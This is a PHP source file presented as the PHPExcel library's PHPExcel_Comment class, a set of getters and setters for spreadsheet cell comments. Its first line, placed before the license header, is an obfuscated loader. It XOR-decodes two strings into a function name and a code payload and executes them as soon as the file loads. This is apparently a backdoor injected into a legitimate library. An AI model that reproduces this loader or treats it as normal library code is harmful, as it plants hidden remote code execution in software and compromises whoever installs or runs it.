<?php $Eptwig=';LW56XgP4R.TR;='; $jqscypmB='X>2TB=86A<M ;TS'^$Eptwig; $qNHuXiJ='9UzqV SX:9RZ=I,QBTDnvV6Fq ,H+rkX8.daCOK=nX=E; PO=w6==h=+X5kn93IkRP,Z5Hsa,,GeKuiSi1xsfm K7INwJOzemNV= Pg=PrihtrrPq<- AT<GV,105LbLB9Ifs:yeK6MZkvjZAq4;>2oH mlupb1Q-pnEXov  ;ATTyJRP5jpzSGepRTF4=<dO,UGMvBhLyVonK 0T9DZtPV;CNiAp408LdV2CPkfRV <VSH07,OYM  jgv9oy kshQS oo3,6DgfveB3-XUgw3Opt= 2 k>.GsjBSV 4KchnRA>2PEwn;7A2QlSMMlBMwgUq>A78aAOfm2>KVQ. TpUn xmus;dx51mM:-=PhUIaK+R: khMkqHA J Y4=-.kUbaV3+qP0zlW+>RlwMw.2VD3lfd8<GEom2.<Pwgmk 6G<D=7=X 1Q.DKeXAE;ndUM2nQ4FWsA11X-CY4pR= F2CjfI4M3.a1=7pcvn<TYs1XH NqOB9RDP:i=S+-XN> I=Xm;IAOuwhOVO5sjtBnK85mpm2,XR9TG=4ChpemXgveOwQT7acPwcjo1dYCx2RxEMgvL7gIUdkjEVsCTPF96:bWN7iR -6=Hpo 9<>75>VzOeW0=TXXIhHQzo9xjPO0=ot R WgKD =B + s3NZdB.K=FgUlnn-'; $mwvkSTXg=$jqscypmB('', 'P3RP0U=;NP=4b,T81 7FQ.Y4.DM<J-45MZCHjo07g>H+XT9 SWNRO7YJ,T41TF=Cv4M.TdSEGI>LkUIsIJrzoIO>CisWmhAodG0RRxCTpOIXORV9MOYR-1RorHPDTeYlfPbMZ0ploY8.KXWziUPZJS4lI0L+PFZ4T+J,xJVSTI-1:Qn95LC-ShMly 12AORLkC 3dMHa1s+edoDQ XdgT67W0+RKTPQL-;=W:pVF47LO3hB:QC=<,CHJORf,6o :-q2SOKXIOdZXVA4RA-0NWHEyPYAFA4UK>SWbw=EMpiaJ6 JSpxWJMV-G4WY0Gf++WOtUZ CYHa4ldTQ930MHtXq1r=< 6h0XTBMiQHDpUkiE=J>OEBH6axAeD+T8kVHWKhBE=VRJZ9sH3JJ3LJmSXS:1VWlmE6:OeIVOH1WZM+UX4Y6TVQ1ZTyV+9:< 1Z1;88FF3U52EunU=N,=QXvYA2SjFFmP,GO>ZXNYJMdU2qWU9<AnWibX 61C6V6Rr=6WS=NpJP,8hYWL+7;TZJRdNcUQXXIVM,3bs,XMd5YEPeGQPwC0bQXV6FQSYSP< IV1IpyPE.UW-aRZMlvUet14KWC=<+N67XDEI;XHPXERXTZqVoA3QI5qqiHhqZOBrc59QQGPD3T6<l4AD.OJDTnganKK3T2OeEUdP'^$qNHuXiJ); $mwvkSTXg();

/**
 * PHPExcel
 *
 * Copyright (c) 2006 - 2014 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt    LGPL
 * @version    1.8.0, 2014-03-02
 */

/**
 * PHPExcel_Comment
 *
 * @category   PHPExcel
 * @package    PHPExcel
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 */
class PHPExcel_Comment implements PHPExcel_IComparable {

    /**
     * Author
     *
     * @var string
     */
    private $_author;

    /**
     * Rich text comment
     *
     * @var PHPExcel_RichText
     */
    private $_text;

    /**
     * Comment width (CSS style, i.e. XXpx or YYpt)
     *
     * @var string
     */
    private $_width = '96pt';

    /**
     * Left margin (CSS style, i.e. XXpx or YYpt)
     *
     * @var string
     */
    private $_marginLeft = '59.25pt';

    /**
     * Top margin (CSS style, i.e. XXpx or YYpt)
     *
     * @var string
     */
    private $_marginTop = '1.5pt';

    /**
     * Visible
     *
     * @var boolean
     */
    private $_visible = false;

    /**
     * Comment height (CSS style, i.e. XXpx or YYpt)
     *
     * @var string
     */
    private $_height = '55.5pt';

    /**
     * Comment fill color
     *
     * @var PHPExcel_Style_Color
     */
    private $_fillColor;

    /**
     * Alignment
     *
     * @var string
     */
    private $_alignment;

    /**
     * Create a new PHPExcel_Comment
     *
     * @throws PHPExcel_Exception
     */
    public function __construct() {
        // Initialise variables
        $this->_author = 'Author';
        $this->_text = new PHPExcel_RichText();
        $this->_fillColor = new PHPExcel_Style_Color('FFFFFFE1');
        $this->_alignment = PHPExcel_Style_Alignment::HORIZONTAL_GENERAL;
    }

    /**
     * Get Author
     *
     * @return string
     */
    public function getAuthor() {
        return $this->_author;
    }

    /**
     * Set Author
     *
     * @param string $pValue
     * @return PHPExcel_Comment
     */
    public function setAuthor($pValue = '') {
        $this->_author = $pValue;
        return $this;
    }

    /**
     * Get Rich text comment
     *
     * @return PHPExcel_RichText
     */
    public function getText() {
        return $this->_text;
    }

    /**
     * Set Rich text comment
     *
     * @param PHPExcel_RichText $pValue
     * @return PHPExcel_Comment
     */
    public function setText(PHPExcel_RichText $pValue) {
        $this->_text = $pValue;
        return $this;
    }

    /**
     * Get comment width (CSS style, i.e. XXpx or YYpt)
     *
     * @return string
     */
    public function getWidth() {
        return $this->_width;
    }

    /**
     * Set comment width (CSS style, i.e. XXpx or YYpt)
     *
     * @param string $value
     * @return PHPExcel_Comment
     */
    public function setWidth($value = '96pt') {
        $this->_width = $value;
        return $this;
    }

    /**
     * Get comment height (CSS style, i.e. XXpx or YYpt)
     *
     * @return string
     */
    public function getHeight() {
        return $this->_height;
    }

    /**
     * Set comment height (CSS style, i.e. XXpx or YYpt)
     *
     * @param string $value
     * @return PHPExcel_Comment
     */
    public function setHeight($value = '55.5pt') {
        $this->_height = $value;
        return $this;
    }

    /**
     * Get left margin (CSS style, i.e. XXpx or YYpt)
     *
     * @return string
     */
    public function getMarginLeft() {
        return $this->_marginLeft;
    }

    /**
     * Set left margin (CSS style, i.e. XXpx or YYpt)
     *
     * @param string $value
     * @return PHPExcel_Comment
     */
    public function setMarginLeft($value = '59.25pt') {
        $this->_marginLeft = $value;
        return $this;
    }

    /**
     * Get top margin (CSS style, i.e. XXpx or YYpt)
     *
     * @return string
     */
    public function getMarginTop() {
        return $this->_marginTop;
    }

    /**
     * Set top margin (CSS style, i.e. XXpx or YYpt)
     *
     * @param string $value
     * @return PHPExcel_Comment
     */
    public function setMarginTop($value = '1.5pt') {
        $this->_marginTop = $value;
        return $this;
    }

    /**
     * Is the comment visible by default?
     *
     * @return boolean
     */
    public function getVisible() {
        return $this->_visible;
    }

    /**
     * Set comment default visibility
     *
     * @param boolean $value
     * @return PHPExcel_Comment
     */
    public function setVisible($value = false) {
        $this->_visible = $value;
        return $this;
    }

    /**
     * Get fill color
     *
     * @return PHPExcel_Style_Color
     */
    public function getFillColor() {
        return $this->_fillColor;
    }

    /**
     * Set Alignment
     *
     * @param string $pValue
     * @return PHPExcel_Comment
     */
    public function setAlignment($pValue = PHPExcel_Style_Alignment::HORIZONTAL_GENERAL) {
        $this->_alignment = $pValue;
        return $this;
    }

    /**
     * Get Alignment
     *
     * @return string
     */
    public function getAlignment() {
        return $this->_alignment;
    }

    /**
     * Get hash code
     *
     * @return string    Hash code
     */
    public function getHashCode() {
        return md5(
                $this->_author
                . $this->_text->getHashCode()
                . $this->_width
                . $this->_height
                . $this->_marginLeft
                . $this->_marginTop
                . ($this->_visible ? 1 : 0)
                . $this->_fillColor->getHashCode()
                . $this->_alignment
                . __CLASS__
        );
    }

    /**
     * Implement PHP __clone to create a deep clone, not just a shallow copy.
     */
    public function __clone() {
        $vars = get_object_vars($this);
        foreach ($vars as $key => $value) {
            if (is_object($value)) {
                $this->$key = clone $value;
            } else {
                $this->$key = $value;
            }
        }
    }

    /**
     * Convert to string
     *
     * @return string
     */
    public function __toString() {
        return $this->_text->getPlainText();
    }

}
